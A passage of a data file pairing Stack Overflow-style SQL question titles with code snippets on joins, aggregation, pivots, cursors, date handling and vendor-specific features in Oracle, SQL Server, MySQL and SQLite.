            GROUP BY TIPO_ASSEPSIA 
            ORDER BY count(TIPO_ASSEPSIA) DESC
    ) x
"
19324,27649,How to summarise data according to the AcctName in Sql query,"SELECT 
    SUM(T0.[DebLTotal]) AS BUDGET, 
    SUM(T3.[Debit]) AS DEBIT,
    AcctName = 
        CASE 
            WHEN SUBSTRING(T1.[Segment_0], 1, 4) BETWEEN '6001' AND '6027' THEN 'Operating Cost' 
            WHEN SUBSTRING(T1.[Segment_0], 1, 4) BETWEEN '5101' AND '5104' THEN 'Travel'
            WHEN SUBSTRING(T1.[Segment_0], 1 ,4) BETWEEN '5001' AND '5001' THEN 'Salaries'
            ELSE T1.[AcctName]
        END                         
FROM OBGT T0 
INNER JOIN OACT T1 
    ON T0.[AcctCode] = T1.[AcctCode]
INNER JOIN OBGS T2 
    ON T0.[Instance] = T2.[AbsId]
INNER JOIN JDT1 T3 
    ON T1.[AcctCode] = T3.[Account]
INNER JOIN OASC T4 
    ON T1.[Project]=T4.[Code] 
GROUP BY
    CASE 
        WHEN SUBSTRING(T1.[Segment_0], 1, 4) BETWEEN '6001' AND '6027' THEN 'Operating Cost' 
        WHEN SUBSTRING(T1.[Segment_0], 1, 4) BETWEEN '5101' AND '5104' THEN 'Travel'
        WHEN SUBSTRING(T1.[Segment_0], 1 ,4) BETWEEN '5001' AND '5001' THEN 'Salaries'
        ELSE T1.[AcctName]
    END  
"
5602,43256,"MYSQL: Select from table A, based on seen date of user in Table B","SELECT RegionName.*, RegionPlayer.*, Players.*
FROM RegionName
JOIN RegionPlayer
    ON RegionPlayer.Regionkey= RegionName.Key
JOIN Players
    ON Players.Key = RegionPlayer.Playerkey
WHERE RegionName.Perent = 'none'
GROUP BY RegionName.Name
HAVING 
    SUM( Seen > (NOW() - INTERVAL 8 DAY ) ) =0
    ORDER BY `RegionName`.`Name` ASC,
    Players.Seen DESC
"
25164,62084,Oracle SQL - intentionally output 2 rows from one source row,"create table test (item varchar(10), old int, new int);
insert into test values ('ITEM A', 123, 456);
insert into test values ('ITEM B', 123, 123);

select item || ' OLD' as item, old as value from test where old <> new
union all
select item || ' NEW' as item, new as value from test where old <> new

Result:
|       ITEM | VALUE |
|------------|-------|
| ITEM A OLD |   123 |
| ITEM A NEW |   456 |
"
6897,45653,Concatenate strings in Oracle SQL without a space in between?,"to_char(10000,'FM99999')
"
35770,4588,Parsing multiple xml elements from an xmlstring in SQL server,"SELECT Pers.value('self::*', 'nchar(10)') as 'ID'
FROM
        @xmlUserId.nodes('/users/id') as EMP(Pers)
"
36433,55812,Sub-Query Problem,"SELECT      DPT.DepName
        ,   EMP.EmpCount
FROM        dbo.Department DPT
CROSS APPLY (
                SELECT  COUNT(EMP.DepartId) AS EmpCount
                FROM    dbo.Employees EMP
                WHERE   EMP.DepartId = DPT.DepartId
            ) EMP           
ORDER BY    DPT.DepName
"
30273,20591,"How can I join two SQL tables, putting a value from the 2nd table into a column in the 1st?","select User,callcost,callclass,date from 1sttable
union all
select User,LineRental,'Line Rental',billdate from 2ndtable
"
19961,36664,dependent Lov in oracle forms 10g,"select order_no,order_name from xx_customer_details;
"
14437,2363,Selecting additional entry not in table without inserting to table,"SELECT A,B FROM TableA
UNION ALL
SELECT 0,'ALL'
"
4105,30205,How to fetch values of column 1 that contain only the given value of column 2?,"SELECT Name
FROM <table>
WHERE Country = 'Mexico'
AND Name NOT IN (
    SELECT Name
    FROM <table>
    WHERE Country <> 'Mexico')
"
22622,48292,SQLite - Order by next upcoming Date (ignore year),"SELECT *
FROM _table
ORDER BY SUBSTR(DATE('NOW'), 6)>(SUBSTR(birthdate, 4, 3) || SUBSTR (birthdate, 1, 2)), (SUBSTR(birthdate, 4, 3) || SUBSTR (birthdate, 1, 2));
"
1283,45371,SQL add up all values in column per month,"SELECT
    YEAR(`Date`) As TheYear, MONTH(`Date`) AS TheMonth, 
    SUM(Amount) AS MonthlyTotal
FROM 
    SomeTable
GROUP BY 
    YEAR(`Date`), MONTH(`Date`);
"
2222,17567,Get rid from one column duplicate values in two column select,"    SELECT t1.NAME, t2.ITEMS
    FROM t1 INNER JOIN t2 ON t1.id = t2.names_id
"
21312,44643,SQL table query setting,"select
    t1.uid,
    t2.limit as A,
    t3.limit as B,
    t4.limit as C
from
    tbl t1
    inner join tbl t2 on
        t1.uid = t2.uid
        and t2.type = 'A'
    inner join tbl t3 on
        t1.uid = t3.uid
        and t3.type = 'B'
    inner join tbl t4 on
        t1.uid = t4.uid
        and t4.type = 'C'
"
33995,14443,Complex SQL Join,"SELECT  a.CorpID,
        b.ClientName AS CorpIDClientName,
        a.DivID,
        c.ClientName AS DivIDName,
        a.DeptID,
        d.ClientName AS DeptIDName
FROM    CustTransaction a
            INNER JOIN CustProfile b
                on a.CorpID = b.ClientID
            INNER JOIN CustProfile c
                on a.DivID = c.ClientID
            INNER JOIN CustProfile d
                on a.DeptID = d.ClientID
"
29180,3611,Null Values during Query,"SELECT 
    attendanceID,
    agentID,
    incurredDate,
    @ld:=(select 
            incurredDate
        from
            attendance
        where
            incurredDate > a.incurredDate
                and agentID = a.agentID
        order by incurredDate
        limit 1) leadDate,
    points,
    @1F:=IF(incurredDate <= DATE_SUB(curdate(),
            INTERVAL IF(incurredDate < '2013-12-02', 90, 60) DAY)
            AND @ld <=> NULL,
        points - 1,
        IF(DATEDIFF(COALESCE(@ld, '1900-01-01'),
                    incurredDate) > IF(incurredDate < '2013-12-02', 90, 60),
            points - 1,
            points)) AS '1stFallOff',
    @2F:=IF(incurredDate <= DATE_SUB(curdate(),
            INTERVAL IF(incurredDate < '2013-12-02',
                180,
                120) DAY)
            AND getLeadDate(incurredDate, agentID) <=> NULL,
        points - 1,
        IF(DATEDIFF(COALESCE(@ld, '1900-01-01'),
                    incurredDate) > IF(incurredDate < '2013-12-02',
                180,
                120),
            points - 2,
            @1F)) AS '2ndFallOff',
    IF((@total + @2F) < 0,
        0,
        IF(DATE_ADD(incurredDate, INTERVAL 365 DAY) <= CURDATE(),
            @total:=0,
            @total:=@total + @2F)) AS Total,
    comment,
    linked,
    DATE_ADD(incurredDate, INTERVAL 365 DAY) AS 'fallOffDate'
FROM
    (SELECT @total:=0) v,
    attendance a
WHERE
    agentID = 'vimunson'
GROUP BY agentID , incurredDate
"
2115,39208,Is it possible to calculate the value of a parameter based on the assigned value of another parameter?,"Declare @SP_Season varchar(50) = @Season 
Declare @PriorSeason_1 varchar(50)
Declare @PriorSeason_2 varchar(50)
Declare @YR numeric 
Declare @Sport varchar (50)

SET @YR = (SELECT RIGHT (SEASON,2) FROM TK_SEASON WHERE SEASON = @SP_Season)
SET @Sport = (SELECT SUBSTRING(SEASON,1,LEN(SEASON)-2) FROM TK_SEASON WHERE SEASON = @SP_Season)
SET @PriorSeason_1 = (@Sport + CONVERT(VARCHAR(100),@YR - 1))
SET @PriorSeason_2 = (@Sport + CONVERT(VARCHAR(100),@YR - 2))
"
25535,61289,"SELECTing the contents of the Table, which is a result of another value","SELECT *, (
    SELECT `TableName` FROM `TableNames` WHERE `TableID`=`IndexType`
) AS `IndexTypeName`, 
CASE 
    WHEN IndexType=1 THEN (SELECT Username FROM Users WHERE IndexRowID=UserID) 
    WHEN IndexType=2 THEN (SELECT MessageContent FROM Messages WHERE IndexRowID=MessageID) 
    WHEN IndexType=3 THEN (SELECT CommentContent FROM Comments WHERE IndexRowID=CommentID) END TableValue
ORDER BY `IndexTime` DESC;
"
18058,14635,"How to GROUP BY date,date's format is nvarchar","SELECT LEFT(date_col,10) AS mydate, COUNT(*) 
FROM your_table
GROUP BY LEFT(date_col,10);
"
14996,47682,SQL query for finding rows with special characters only,"SELECT
    TemplateID,
    Body
FROM
    #Template
WHERE
    Body LIKE '%[^0-9a-zA-Z ]%'
"
35527,13524,Continue from top in SQL SERVER Cursor?,"DECLARE db_cursor CURSOR FOR SELECT age, name, color FROM table; 
DECLARE @myName VARCHAR(256);
DECLARE @myAge INT;
DECLARE @myFavoriteColor VARCHAR(40);
OPEN db_cursor;
FETCH NEXT FROM db_cursor INTO @myName, @myAge, @myFavoriteColor;
WHILE @@FETCH_STATUS = 0  
BEGIN  
       --Do stuff 
       IF @myAge=1
       BEGIN
          Goto Cont
       END    
       --Do stuff 

Cont:
       FETCH NEXT FROM db_cursor INTO @myName, @myAge, @myFavoriteColor;
END;
CLOSE db_cursor;
DEALLOCATE db_cursor;
"
29925,21316,tsql query - select records from 2 tables without joining them,"UPDATE t1
    SET emp_no = t2.dept_no
    FROM table1 t1
        INNER JOIN table2 t2
            ON t1.dept_name = t2.dept_name
"
26144,34930,First two rows per combination of two columns,"SELECT message_id, creating_user_id, receiving_user_id, created_utc
FROM (
   SELECT *
        , row_number() OVER (PARTITION BY GREATEST (creating_user_id
                                                  , receiving_user_id)
                             ORDER BY created_utc) AS rn
   FROM   messages
   WHERE  1 IN (creating_user_id, receiving_user_id)
   ) sub
WHERE  rn < 3
ORDER  BY created_utc;
"
22990,40456,To subselect or not to subselect?,"SELECT 
    id_topic, id_member_comment, pd.username, dt_post
FROM
   (
   SELECT MAX(last_id_comment) AS id_comment
   FROM forum_topic 
   GROUP BY cat_id
   ) AS foo
   JOIN
   forum_comment c ON foo.id_comment = c.id_comment --AND a cat_id join too?
   LEFT JOIN
   persondata pd ON c.id_member_comment = pd.id_member;
"
31274,44037,how to reconstruct this sql query,"SELECT U.user_key
     ,U.user_id
     ,U.user_status
     ,U.user_company_name
FROM [user] U
INNER JOIN room R ON R.user_key = U.user_key
INNER JOIN service_option S ON S.room_key = R.room_key
                              AND S.service_option_key = 3
                              AND S.ordered_service_Option_status != 0
"
24115,6221,Return custom value if join not successfull?,"  a.deptcode || '  ' || coalesce (b.deptname, '<missing>') as fulldeptname
"
15299,20676,"In Oracle APEX, How to check number of working hours as a Developer I spent?","Administration > Monitor Activity > Application Changes by Day / By Developer / ...
"
29182,38833,SQL Copy part of a column into a new column,"UPDATE Address SET
  PreAddress=Replace(a.PreAddress,b.City,''),
  City=b.City
FROM Address a INNER JOIN Cities b  ON b.City=RIGHT(a.PreAddress,LEN(b.city))
"
24671,3648,T-SQL: A proper way to CLOSE/DEALLOCATE cursor in the update trigger,"CREATE TRIGGER trigger1 ON [dbo].[table1] AFTER UPDATE
AS 
BEGIN                           
    --declare some vars
    DECLARE @Col1 SMALLINT, @Col1 TINYINT 

    BEGIN TRY
        --declare cursor            
        DECLARE Cursor1 CURSOR FOR 
        SELECT Col1, Col2 FROM INSERTED                     

        --do the job
        OPEN Cursor1
        FETCH NEXT FROM Cursor1 INTO @Col1, @Col2

        WHILE @@FETCH_STATUS = 0
        BEGIN
            IF ...something...
                    EXEC myProc1 @param1 = @Col1, @Param2 = @Col2
            ELSE
            IF ...something else...
                    EXEC myProc2 @param1 = @Col1, @Param2 = @Col2

            FETCH NEXT FROM Cursor1 INTO @Col1, @Col2                               
        END
    END TRY
    BEGIN CATCH
        --do what you have to
    END CATCH

    BEGIN TRY
        --clean it up               
        CLOSE Cursor1
        DEALLOCATE Cursor1                                  
    END TRY
    BEGIN CATCH
        --do nothing
    END CATCH
END
"
7570,51932,"Reference data from another table, connected by a foreign key","select stories.*
from stories
join poster on poster.poster_id = stories.poster_id
where poster.group_id = '$logged_in_user_group'
"
19207,67447,How to specify the library of an SQL function on the IBM i,"CONNECT (systemname)
SET PATH=QGPL
SELECT RTVLIBL() FROM SYSIBM.SYSDUMMY1
"
1326,47818,how to take all values from sql table column on condition?,"select 
*
from [vwMYDATA] 
where
Path like '%' + @path + '%' and
((@status IS NULL )OR (Status = @status or status IS NULL))
"
38279,53852,Query for a string containing a particular character,"SELECT * FROM person_info WHERE name LIKE '%k%'
"
31630,45661,Selecting record where string value begins with number,"select * from productmanufacturers where Name like '[0-9]%'
"
11516,64326,Oracle : SQL using REGEXP_LIKE,"select 
  regexp_substr(
    '/var1/var2/var3/**C751994ZP1QT11**/var4.itp', 
    '/\*\*.*\*\*/') 
from dual
"
5420,17652,SQL Mapping item code from another table,"SELECT 
    [ORDER].TICKET_NUMBER,
    ITEM_DESCRIPTION.ITEM
FROM [ORDER] 
INNER JOIN ITEM DESCRIPTION ON (Order.ITEM=ITEM_DESCRIPTION.CODE)
"
11926,26559,MySQL logging a user on from one table & count occurrences from another in same statement,"SELECT a.aId,
       a.aEmail,
       a.aBio,
       a.aReg,
       (SELECT COUNT(*) 
          FROM messages 
         WHERE mRead=0 AND mReciever=a.aId) occurrences
  FROM authors a
 WHERE a.aEmail = 'email@mail.com' AND a.aPass = '*****'
"
39803,31485,count using inner join from 2 tables,"SELECT Type.[Display Name], 
       COUNT(*) AS [Number of Documents]
FROM Document_type_de Type
JOIN Document D
    ON Type.ID = D.documenttypede
GROUP BY Type.[Display Name]
ORDER BY Type.[Display Name]
"
6258,25587,SQL query where ALL records in a join match a condition?,"SELECT u.* 
FROM users AS u
WHERE u.id NOT IN (
    SELECT DISTINCT user_id FROM tags WHERE name NOT IN ('word1', 'word2')
) AND EXISTS (SELECT user_id FROM tags WHERE user_id = u.id) 
"
23003,23585,Update SQL query for multiple values,"UPDATE wp_postmeta 
INNER JOIN wp_postmeta olddata 
ON meta_value = olddata.meta_value and
   olddata.meta_key =  'product'
SET meta_value=olddata.post_id
WHERE meta_key = 'myslug_product'
"
31267,28168,Get the last twelve months worth of data from a database,"SELECT ... WHERE STR_TO_DATE(CONCAT(period_name,' 1 ',year),'%M %d %Y') >= DATE_SUB(STR_TO_DATE(CONCAT(most_recent_period_name,' 1 ',most_recent_year),'%M %d %Y'), INTERVAL 1 YEAR) ...;
"
13246,55321,SQL Query based on complex business logic,"SELECT  result.ID, 
        result.DeviceID, 
        MAX(start.Timestamp) StartTime, 
        result.Timestamp EndTime, 
        result.Measure
FROM    T result
        INNER JOIN T start
            ON start.DeviceID = result.DeviceID
            AND start.Timestamp < result.Timestamp
            AND start.DataType = 19
            AND start.Measure = 1
WHERE   result.DataType = 54
GROUP BY result.ID, result.DeviceID, result.Timestamp, result.Measure
"
1612,29017,mix `select` query results by certain column,"SELECT *
FROM list
WHERE server='1'
ORDER BY important DESC, rand();
"
18351,61577,Converting XML Datetime to SQL Datetime,"Declare @Xml Xml
Set @Xml = '<Root><DateFrom>8/10/2008</DateFrom></Root>'

Declare @DateFrom DateTime
Select @DateFrom= t.b.value('DateFrom[1]', 'datetime')
from @xml.nodes('//Root') t(b)
"
21216,36002,Select product having more than one color?,"select p.name
from products p
join productColors pc on pc.p_id = p.id
where pc.color in ('green','red','yellow')
group by p.id, p.name
having count(distinct pc.id) = 3
"
13610,16575,Select rows in Database with int type whose value is NULL,"UPDATE timeblock SET break_minutes=0 WHERE break_minutes IS NULL
"
26706,63132,Deleting from table based upon the result set of other query,"DELETE  A
  FROM  I_IPV_LOB_PROG_PROV_MO_MTRC_TRNS A
    INNER JOIN V_SRC_I_FIN_ENGMNT_STG B ON A.MO_ID BETWEEN B.M24no AND B.M0no
  WHERE LST_UPD_USERID = 'FINANCE'
"
18508,73529,Database query on 2 tables,"Select * from tag_details 
   where tag_details_id not in 
                        (Select tag_details_id from movie_tags)
"
4732,4415,How do I find the high water mark (for sessions) on Oracle 9i,"SELECT sessions_highwater FROM v$license;
"
1232,31936,Have a subquery return a row instead of a column,";WITH LastEmails
AS
(
   SELECT *, 
     ROW_NUMBER() OVER(ORDER BY Timestamp DESC) rownum
   FROM Emails
   WHERE Contact = @emailId
     AND (IsSent is null OR isSent = 0)
)
SELECT * FROM LastEmails
WHERE rownum = 1;
"
17807,47175,sql server if exists issue,"USE [Product]
GO

SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER ON
GO

ALTER Proc  [Controls].[spSiloSettings]
    @Silo int
    ,@PartNo Varchar (50)
    ,@Slow float output 
    ,@Close  float output 
    ,@errorout int output
AS
BEGIN
    declare @found bit = 0

    set @errorout = 0

    select @slow = slow
    , @close = close 
    , @found = 1
    from controls.TableA 
    where silo = @silo 
    and partno = @partno 

    if @found != 1
    begin

        select top 1
          @found = 1
        , @slow= slow
        , @close = close
        From controls.TableB
        Where silo = @silo
        --order by something to ensure consistent results?

        if @found = 1
        begin
            insert into controls.TableA (silo, partno, slow, close) 
            values (@silo, @partno ,@slow, @close)
        end
        else
        begin
            @errorout = 1 --neither A nor B held the value we were after
        end
    end

END
"
30835,62173,Oracle utl_match special characters,"SQL> ed
Wrote file afiedt.buf

  1  declare
  2    l_char1 varchar2(1 char) := 'á';
  3    l_char2 varchar2(1 char) := 'b';
  4  begin
  5    dbms_output.put_line(
  6      'In AL32UTF8: ' ||
  7        utl_match.edit_distance( l_char1, l_char2 ) );
  8    dbms_output.put_line(
  9      'In WE8ISO8859P15: ' ||
 10        utl_match.edit_distance(
 11            CONVERT( l_char1, 'WE8ISO8859P15', 'AL32UTF8' ),
 12            CONVERT( l_char2, 'WE8ISO8859P15', 'AL32UTF8' ) ) );
 13    dbms_output.put_line(
 14      'In AL16UTF16: ' ||
 15        utl_match.edit_distance(
 16            CONVERT( l_char1, 'AL16UTF16', 'AL32UTF8' ),
 17            CONVERT( l_char2, 'AL16UTF16', 'AL32UTF8' ) ) );
 18* end;
SQL> /
In AL32UTF8: 2
In WE8ISO8859P15: 1
In AL16UTF16: 1

PL/SQL procedure successfully completed.
"
37829,49467,Update query in oracle,"    update emails
    set email = REPLACE(email,'@gmail.com','@yahoo.com')
    where email like '%@gmail.com%'
"
24000,21944,Quickest query to check for the existence of a row in Oracle?,"declare
   l_cnt integer;
begin
   select count(*)
   into   l_cnt
   from   x
   where  x.col_a = value_a 
   and    x.col_b = value_b
   and    rownum = 1;
end;
"
21480,69442,Mysql- One table Two query in one statement,"SELECT card_id
FROM
(
    SELECT card_id, MONTH(days) AS card_month, SUM(YTL) as card_sum
    FROM expenses
    WHERE days BETWEEN ""2014-05-01"" AND ""2015-06-30""
    GROUP BY card_id, card_month
    HAVING card_sum >= 40
) sub0
GROUP BY card_id 
HAVING COUNT(*) = 2
"
13234,69255,SQL - Check Availability,"SELECT * FROM `hotel_rate`
WHERE
  from_date BETWEEN ? AND ?
  OR to_date BETWEEN ? AND ?
"
15431,24893,SQL query - How to add same ID values to values from another column?,"UPDATE  your_table s
JOIN
(SELECT (@r:=@r+1) rn, t.name FROM
(SELECT DISTINCT name FROM your_table) t
,(SELECT @r:=399) nums) tab
ON tab.name = s.name
SET s.ID = tab.rn;
"
82,56780,How i can apply sub query in join,"select 
requester.name as Requester,
approver.name as Approver
from Logs as l
join userDetail as requester on l.requesterId = requester.userid
join userDetail as approver on l.ApproveId = approver.userid
"
14401,59829,Stored Procedure betwee particular date,"CREATE PROCEDURE usp_orders_by_dates 
    @dateStart DATETIME,
    @dateEnd DateTime 
AS
    SELECT
    o.OrderID
    ,o.CustomerID
    ,c.CompanyName AS CustomerCompany
    ,s.ShipperID
    ,s.Company AS ShipperCompany
    ,@date AS ShippedDate

    FROM Orders o
    INNER JOIN Customer c
        ON o.CustomerID = c.CustomerID
    INNER JOIN Shippers s    
        ON o.ShipperID = s.ShipperID
      WHERE ShipperDate BETWEEN @startDate AND @endDate
    ORDER BY
      ShipperDate
"
2001,8506,SQL query problem,"SELECT *
FROM `friends` AS Friend
WHERE
 (
  (Friend.user_id    = 1618 AND Friend.profile_id    = 290)
  OR
  (Friend.to_user_id = 1618 AND Friend.to_profile_id = 290)
 )
 AND
 NOT
 (
  (Friend.user_id    = 1817 AND Friend.profile_id    = 393)
  OR
  (Friend.to_user_id = 1817 AND Friend.to_profile_id = 393)
  )
 )
"
33351,44475,Time averaging non-continuous data with PostgreSQL9.2,"  SELECT MIN(dt.""Timestamp"") AS ""Timestamp_min"",
         avg(dt.""datastream1"") AS ""datastream1_avg_min"",
         stddev(dt.""datastream1"") AS ""datastream1_stdev_min"",
         count(dt.""datastream1"") AS ""datastream1_avg_min""
  FROM ""DATATABLE"" dt
  GROUP BY trunc(extract(epoch from dt.""TimeStamp"") / (60*10));
"
21165,69674,How to achive below output using sql query in oracle 11g.?,"SQL> select * from data order by block_id;

  BLOCK_ID      VALUE
---------- ----------
         1          5
         2          5
         3          5
         4          0
         5          0
         6          4
         7          4
         9          5
        10          5
        12          2

SQL> select min(block_id) || '-' || max(block_id) block_range, value
  2    from (select block_id, value, max(grp) over (partition by value order by block_id) grp
  3            from (select block_id, value,
  4                         case
  5                           when lag(block_id) over (partition by value order by block_id) < block_id - 1
  6                           then
  7                             row_number() over (partition by value order by block_id)
  8                           when row_number() over (partition by value order by block_id) = 1 then 1
  9                           else null
 10                         end grp
 11                    from data
 12                   where value != 0))
 13   group by value, grp
 14   order by min(block_id);

BLOCK_RANG      VALUE
---------- ----------
1-3                 5
6-7                 4
9-10                5
12-12               2
"
276,33721,SQL Server Query with Pivot table,"CREATE TABLE [dbo].[tblTest](
    [Item] [varchar](50) NOT NULL,
    [Count] [int] NOT NULL,
    [Date] [date] NOT NULL
) 


insert into tblTest values('item1', 10, '01MAR14')
insert into tblTest values('item1', 5 , '02MAR14')
insert into tblTest values('Item2', 5 , '01MAR14')
insert into tblTest values('item3', 12, '03MAR14')
insert into tblTest values('item2', 12, '04MAR14')
insert into tblTest values('item3', 2 , '05MAR14')
insert into tblTest values('item1', 3 , '05MAR14')


SELECT Item, IsNull([2014-03-05], 0) as [2014-03-05], Isnull([2014-03-04], 0) [2014-03-04], IsNull([2014-03-03],0) [2014-03-03], ISNULL([2014-03-02], 0) as 'Before[2014-03-01]'
    FROM (
        SELECT 
            Item, case when [Date] < '2014-03-03' then '2014-03-02' else [DATE] end as [Date],  [Count]
        FROM tblTest
    ) AS s
    PIVOT
    (
        sum([Count])
        FOR [Date] IN ([2014-03-05],[2014-03-04],[2014-03-03], [2014-03-02])
    )AS pivotTable
"
5240,701,estimating how long a delete statement should take in mysql,"CREATE TABLE tmp_table2 LIKE table2;
ALTER TABLE tmp_table2 DISABLE KEYS;
INSERT INTO tmp_table2 SELECT t2.* FROM table2 AS t2 JOIN table1 AS t1 ON t1.CITY = t2.CITY WHERE t1.country != 'Russia';
ALTER TABLE tmp_table2 ENABLE KEYS;
DROP TABLE table2;
RENAME TABLE tmp_table2 TO table2;
"
24919,6766,SQL Multiple Query with 1 Result Set,"select id, lname, fname from table1 t1 where t1.id not exists in (select id from table2)
"
26242,1068,Mysql: help in query from two tables,"SELECT u1.name as from_name,
       u2.name as to_name
FROM Friends AS f
JOIN Users AS u1 ON u1.users_id = f.fromid
JOIN Users AS u2 ON u2.users_id = f.toid
"
1807,72063,Denormalization: How much is too much?,"For example, say someone clicks on a t.co link to blog.example.com/foo at 11:41am on 1st Feb. 
Rainbird would increment counters for:

 t.co click: com (all time)
 t.co click: com.example (all time)
 t.co click: com.example.blog (all time)
 t.co click: com.example.blog /foo (all time)
 t.co click: com (1st Feb 2011)
 t.co click: com.example (1st Feb 2011)
 t.co click: com.example.blog (1st Feb 2011)
 t.co click: com.example.blog /foo (1st Feb 2011)
 t.co click: com (11am-12 on 1st Feb)
 t.co click: com.example (11am-12 on 1st Feb)
 t.co click: com.example.blog (11am-12 on 1st Feb)
 t.co click: com.example.blog /foo (11am-12 on 1st Feb)
 t.co click: com (11:41-42 on 1st Feb)
 t.co click: com.example (11:41-42 on 1st Feb)
 t.co click: com.example.blog (11:41-42 on 1st Feb)
 t.co click: com.example.blog /foo (11:41-42 on 1st Feb)
"
12760,55365,Generating multiple data with SQL query,"WITH E1(N) AS( -- 10 ^ 1 = 10 rows
    SELECT 1 FROM(VALUES (1),(1),(1),(1),(1),(1),(1),(1),(1),(1))t(N)
),
E2(N) AS(SELECT 1 FROM E1 a CROSS JOIN E1 b), -- 10 ^ 2 = 100 rows
E4(N) AS(SELECT 1 FROM E2 a CROSS JOIN E2 b), -- 10 ^ 4 = 10,000 rows
CteTally(N) AS(
    SELECT TOP(SELECT MAX(Tracks) FROM Product_Asset) 
        ROW_NUMBER() OVER(ORDER BY(SELECT NULL))
    FROM E4
)
SELECT
    Id  = ROW_NUMBER() OVER(ORDER BY pa.PAId, t.N),
    pa.PAId,
    TrackNumber = t.N
FROM Product_Asset pa
INNER JOIN CteTally t
    ON t.N <= pa.Tracks
"
24275,52188,Oracle: query against value of user defined type,"select count(1) from table_of_my_messages m 
    where m.user_data.relatedid = 'abcdefgh';
"
10733,16173,SQL - Select Query for complex dynamic rows,"SELECT
      t1.ListingID
FROM 
      TableX AS t1 

  JOIN                                --- 2nd JOIN
      TableX AS t2
    ON 
      t2.ListingID = t1.ListingID 

  JOIN                                --- 3rd JOIN
      TableX AS t3
    ON 
      t3.ListingID = t1.ListingID 

WHERE 
      (t1.ExtraFieldID, t1.Value) = (@ExtraFieldID_search1, @Value_search1)

                        --- 2nd condition
  AND 
      (t2.ExtraFieldID, t2.Value) = (@ExtraFieldID_search2, @Value_search2)

                        --- 3rd condition
  AND 
      (t3.ExtraFieldID, t3.Value) = (@ExtraFieldID_search3, @Value_search3)
"
20445,67560,Return multiple rows from multi SELECT subquery,"SELECT MAX(NAME) as NAME, MAX(PROJECT_NAME) as PROJECT_NAME,
       MAX(FILTER_NAME) as FILTER_NAME
FROM ((SELECT (@rnpc := @rnpc + 1) as rn, NAME, NULL as PROJECT_NAME, NULL as FILTER_NAME
      FROM product_component CROSS JOIN
           (SELECT @rnpc := 0) params
      ) UNION ALL
      (SELECT (@rnpn := @rnpn + 1) as rn, NULL, PROJECT_NAME, NULL as FILTER_NAME
      FROM jira_project CROSS JOIN
           (SELECT @rnpn := 0) params
      ) UNION ALL
      (SELECT (@rnf := @rnf + 1) as rn, NAME, NULL as PROJECT_NAME, NULL as FILTER_NAME
      FROM jira_filter CROSS JOIN
           (SELECT @rnf := 0) params
      )
     ) t
GROUP BY rn
ORDER BY rn;
"
5415,29042,Converting output of sql query,"select Id,
case status when 0 then 'unpaid' when 1 then 'paid' else 'unknown' end as Status
from Payments
"
25739,74346,regex for string starts with characters in range,"^((A[b-z])|(B[a-z])|(C[a-h]))
"
20637,31235,How to include loan rules in Employee and Loan sql query?,"select e.EmployeeID, E.FullName,l.EndDate, 
       (case when l.EmployeeID is null then 'Eligible'
             when DATEDIFF(month, max(l.EndDate), GETDATE()) > 12  then 'Eligible' 
             when DATEDIFF(month, max(l.EndDate), GETDATE()) =<  12  then 'Not Eligible' 
             when l.IsOnProbation = 1 then 'Not Eligible' 
        else 'Not Eligible'
        end) as Status,
         (case when l.EmployeeID is null then 'Loan not taken'
             when DATEDIFF(month, max(l.EndDate), GETDATE()) > 12  then 'Loan taken over 1 year ago' 
             when DATEDIFF(month, max(l.EndDate), GETDATE()) <=  12  then 'Loan already taken' 
             when l.IsOnProbation = 1 then 'On probation' 
        else 'Not Eligible'
        end) as Reason
FROM Employee e 
    left join Loan l on e.EmployeeID = l.EmployeeID
group by e.EmployeeID, e.FullName, l.EndDate
"
2580,15486,How can I join one-to-two linked tables?,"SELECT
    Event.id,
    Event.description,
    P1.name AS person1_name,
    P2.name AS person2_name
  FROM Event
    LEFT JOIN Person P1
      ON Event.id = P1.event_id
    LEFT JOIN Person P2
     ON Event.id = P2.event_id 
WHERE P1.id < P2.id
UNION ALL
SELECT
    Event.id,
    Event.description,
    P1.name AS person1_name,
    P2.name AS person2_name
  FROM Event
    LEFT JOIN Person P1
      ON Event.id = P1.event_id
    LEFT JOIN Person P2
     ON Event.id = P2.event_id AND P1.id <> P2.id
WHERE P2.id IS NULL
"
5355,44771,Join 2 tables with a column with same values,"SELECT ta.*, tb.* FROM

(select componentes_process.id_comp_process,componentes_process.id_intervencao,componentes_process.id_equip, componentes_equip.nome, sum(componentes_process.quantidade) as quantidade from manutencao.componentes_equip 
left join manutencao.componentes_process on componentes_process.nome=componentes_equip.nome and componentes_process.id_intervencao=1362 
where id_tipo_equip=1 group by nome) ta

INNER JOIN 

(select id_tipo_equip,componentes_equip.nome,sum(componentes_process.quantidade) as total from manutencao.componentes_equip 
left join manutencao.componentes_process on componentes_process.nome=componentes_equip.nome
left join manutencao.intervencao_process on intervencao_process.id_intervencao=componentes_process.id_intervencao
left join manutencao.processos on processos.id_process=intervencao_process.id_process and intervencao_process.id_process=639
where id_tipo_equip='1' group by nome) tb on ta.nome=tb.nome
"
17762,41708,Custom ordering in sqlite,"  SELECT _id, Name, Key 
    FROM my_table t 
ORDER BY CASE WHEN key = 'Key' THEN 0 
              WHEN key = 'Named' THEN 1 
              WHEN key = 'Contributing' THEN 2 END, id;
"
11265,12156,SQL script to insert Word document Into a SQL Server 2005 table,"INSERT INTO dbo.Documents(DocName, DocContent)
   SELECT
       'C:\tmp\mydoc.doc', 
       BulkColumn
   FROM
       OPENROWSET(BULK N'C:\tmp\mydoc.doc', SINGLE_BLOB) blob
"
24532,22226,Basic SQL join query,"select
    *
from 
    eb
    inner join e on eb.eId = e.eId
    inner join et on e.etId = et.etId
    left join p
           inner join pa on p.paId = pa.paId
           inner join ac on pa.acId = ac.acId
        on eb.pId = p.pId
"
4029,72869,"mysql - group, but show all row of a column","SELECT  staff.name,
        staff.designation_id_designation,
        staff.status_id_status,
        GROUP_CONCAT(Concat_Ws('=', leave_remain.leave_type_id_leave_type, leave_remain.days)) AS remain
FROM    staff 
        INNER JOIN leave_remain 
            ON staff.id_staff = leave_remain.staff_id_staff
GROUP   BY staff.name, staff.designation_id_designation, staff.status_id_status  
"
23520,7417,Calculate length of stay in certain location (include in-between stays at other locations if less than 48 hrs),"select patientid, min(indatetime) as indatetime, max(outdatetime) as outdatetime
from
(
  select patientid, indatetime, outdatetime,
    sum(IsStart) over (partition by patientid order by indatetime) as GRP
  from
  (
    select patientid, indatetime, outdatetime,
      case when isnull(lag(outdatetime) over (partition by patientid order by indatetime),'21001231') != indatetime then 1 else 0 end as IsStart
    from
    (
      select * from (
        select patientid,location,min(indatetime) as indatetime,max(outdatetime) as outdatetime from (
